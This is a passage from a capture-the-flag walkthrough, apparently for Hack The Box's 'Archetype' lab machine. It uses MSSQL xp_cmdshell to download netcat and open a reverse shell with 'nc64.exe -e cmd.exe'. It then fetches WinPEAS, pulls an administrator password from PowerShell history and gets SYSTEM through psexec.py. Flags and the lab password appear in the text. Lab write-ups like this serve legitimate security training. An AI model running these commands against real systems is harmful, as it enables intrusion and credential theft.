+<pre><code>wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe -O nc64.exe
+</code></pre>
+<ul>
+<li>We can spin up a temp web server on our machine for the victim to download from</li>
+<li>Let’s also create a listener to capture the input (using tmux to make this easier)</li>
+</ul>
+<pre><code>python3 -m http.server 80
+nc -lvnp 443
+</code></pre>
+<ul>
+<li>Also doing some additional testing, looks like we can call powershell as well</li>
+</ul>
+<pre><code>SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell &quot;powershell -c pwd&quot;  
+output                   
+-------------------      
+NULL                     
+  
+Path                     
+  
+----                     
+  
+C:\Windows\system32      
+  
+NULL                     
+  
+NULL                     
+  
+NULL
+</code></pre>
+<ul>
+<li>Now, let’s download the file onto the machine</li>
+</ul>
+<pre><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.82/nc64.exe -outfile nc64.exe&quot;
+</code></pre>
+<ul>
+<li>Time to run it and bind to our listener</li>
+</ul>
+<pre><code>xp_cmdshell &quot;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.95.187 443&quot;
+</code></pre>
+<ul>
+<li>We are able to get access onto the machine</li>
+</ul>
+<pre><code>Ncat: Version 7.93 ( https://nmap.org/ncat )  
+Ncat: Listening on :::4444  
+Ncat: Listening on 0.0.0.0:4444  
+Ncat: Connection from 10.129.95.187.  
+Ncat: Connection from 10.129.95.187:49676.  
+Microsoft Windows [Version 10.0.17763.2061]  
+(c) 2018 Microsoft Corporation. All rights reserved.  
+  
+C:\users\sql_svc\Downloads>
+</code></pre>
+<ul>
+<li>We can grab the user flag with no issue</li>
+</ul>
+<pre><code>C:\Users\sql_svc\Desktop>type user.txt  
+type user.txt  
+3e7b102e78218e935bf3f4951fec21a3
+</code></pre>
+<ul>
+<li>Now, we need to escalate our privileges to get the root flag</li>
+<li>We’ll use WinPEAS for that.</li>
+<li>We can go ahead and download a copy onto the victim</li>
+</ul>
+<pre><code>C:\Users\sql_svc\Desktop>powershell                                                 
+powershell  
+Windows PowerShell    
+Copyright (C) Microsoft Corporation. All rights reserved.  
+  
+PS C:\Users\sql_svc\Desktop> wget http://10.10.14.82:8000/winPEASx64.exe -outfile winPEASx64.exe  
+wget http://10.10.14.82:8000/winPEASx64.exe -outfile winPEASx64.exe  
+PS C:\Users\sql_svc\Desktop> ls  
+ls  
+  
+  
+   Directory: C:\Users\sql_svc\Desktop  
+  
+  
+Mode                LastWriteTime         Length Name                                                                     
+----                -------------         ------ ----                                                                     
+-a----       11/27/2025  10:23 PM              0 type                                                                     
+-ar---        2/25/2020   6:37 AM             32 user.txt                                                                 
+-a----       11/27/2025  10:25 PM       10166272 winPEAx64.exe
+</code></pre>
+<ul>
+<li>We can now run it to find something</li>
+<li>From the results, we can see that this machine is vulnerable to the juicy potato exploit</li>
+<li>First though, let’s check a possible place where the password can easily leak out: PowerShell history</li>
+<li>We can find this within this directory:</li>
+</ul>
+<pre><code>C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\
+</code></pre>
+<ul>
+<li>Once we are there, we can then read out the ConsoleHost_history.txt file by using type:</li>
+</ul>
+<pre><code>type ConsoleHost_history.txt
+</code></pre>
+<ul>
+<li>We then get the following output, in which we can get a password:</li>
+</ul>
+<pre><code>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!  
+exit  
+</code></pre>
+<ul>
+<li>Now, we can use a script like psexec.py to get a shell into the system:</li>
+</ul>
+<pre><code>psexec.py administrator@10.129.11.151
+</code></pre>
+<ul>
+<li>From here, we can see that we get to be the administrator now. Yay!</li>
+</ul>
+<pre><code>C:\Windows\system32> whoami  
+nt authority\system
+</code></pre>
+<ul>
+<li>From here, let’s go ahead and grab the root flag</li>
+</ul>
+<pre><code>C:\Users\Administrator\Desktop> dir  
+Volume in drive C has no label.  
+Volume Serial Number is 9565-0B4F  
+  
+Directory of C:\Users\Administrator\Desktop  
+  
+07/27/2021  01:30 AM    &lt;DIR>          .  
+07/27/2021  01:30 AM    &lt;DIR>          ..  
+02/25/2020  06:36 AM                32 root.txt  
+              1 File(s)             32 bytes  
+              2 Dir(s)  10,708,439,040 bytes free  
+  
+C:\Users\Administrator\Desktop> type root.txt  
+b91ccec3305e98240082d4474b848528
+</code></pre></div></article><hr/><div class="page-footer"></div></div><div class="right sidebar"><div class="graph"><h3>Graph View</h3><div class="graph-outer"><div class="graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:1,&quot;scale&quot;:1.1,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.3,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:false,&quot;enableRadial&quot;:false}"></div><button class="global-graph-icon" aria-label="Global Graph"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 55 55" fill="currentColor" xml:space="preserve"><path d="M49,0c-3.309,0-6,2.691-6,6c0,1.035,0.263,2.009,0.726,2.86l-9.829,9.829C32.542,17.634,30.846,17,29,17
+                s-3.542,0.634-4.898,1.688l-7.669-7.669C16.785,10.424,17,9.74,17,9c0-2.206-1.794-4-4-4S9,6.794,9,9s1.794,4,4,4
+                c0.74,0,1.424-0.215,2.019-0.567l7.669,7.669C21.634,21.458,21,23.154,21,25s0.634,3.542,1.688,4.897L10.024,42.562
+                C8.958,41.595,7.549,41,6,41c-3.309,0-6,2.691-6,6s2.691,6,6,6s6-2.691,6-6c0-1.035-0.263-2.009-0.726-2.86l12.829-12.829
+                c1.106,0.86,2.44,1.436,3.898,1.619v10.16c-2.833,0.478-5,2.942-5,5.91c0,3.309,2.691,6,6,6s6-2.691,6-6c0-2.967-2.167-5.431-5-5.91
+                v-10.16c1.458-0.183,2.792-0.759,3.898-1.619l7.669,7.669C41.215,39.576,41,40.26,41,41c0,2.206,1.794,4,4,4s4-1.794,4-4
+                s-1.794-4-4-4c-0.74,0-1.424,0.215-2.019,0.567l-7.669-7.669C36.366,28.542,37,26.846,37,25s-0.634-3.542-1.688-4.897l9.665-9.665
+                C46.042,11.405,47.451,12,49,12c3.309,0,6-2.691,6-6S52.309,0,49,0z M11,9c0-1.103,0.897-2,2-2s2,0.897,2,2s-0.897,2-2,2
+                S11,10.103,11,9z M6,51c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S8.206,51,6,51z M33,49c0,2.206-1.794,4-4,4s-4-1.794-4-4
+                s1.794-4,4-4S33,46.794,33,49z M29,31c-3.309,0-6-2.691-6-6s2.691-6,6-6s6,2.691,6,6S32.309,31,29,31z M47,41c0,1.103-0.897,2-2,2
+                s-2-0.897-2-2s0.897-2,2-2S47,39.897,47,41z M49,10c-2.206,0-4-1.794-4-4s1.794-4,4-4s4,1.794,4,4S51.206,10,49,10z"></path></svg></button></div><div class="global-graph-outer"><div class="global-graph-container" data-cfg="{&quot;drag&quot;:true,&quot;zoom&quot;:true,&quot;depth&quot;:-1,&quot;scale&quot;:0.9,&quot;repelForce&quot;:0.5,&quot;centerForce&quot;:0.2,&quot;linkDistance&quot;:30,&quot;fontSize&quot;:0.6,&quot;opacityScale&quot;:1,&quot;showTags&quot;:true,&quot;removeTags&quot;:[],&quot;focusOnHover&quot;:true,&quot;enableRadial&quot;:true}"></div></div></div><div class="toc"><button type="button" class="toc-header" aria-controls="toc-2773" aria-expanded="true"><h3>Table of Contents</h3><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><ul id="list-1" class="toc-content overflow"><li class="depth-0"><a href="#tasks" data-for="tasks">Tasks</a></li><li class="depth-0"><a href="#steps" data-for="steps">Steps</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v5.0.0</a> © 2026</p><ul><li><a href="https://github.com/jackyzha0/quartz">GitHub</a></li><li><a href="https://discord.gg/cRFFHYye7t">Discord Community</a></li></ul></footer></div></div></body><script src="../static/resource-after-e13fffa1.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-8b336f9a.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-baba652b.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-5eb75950.js" type="module" data-persist="true"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-683f275d.js" type="application/javascript" data-persist="true"></script><script src="../postscript.js" type="module" data-persist="true"></script></html>
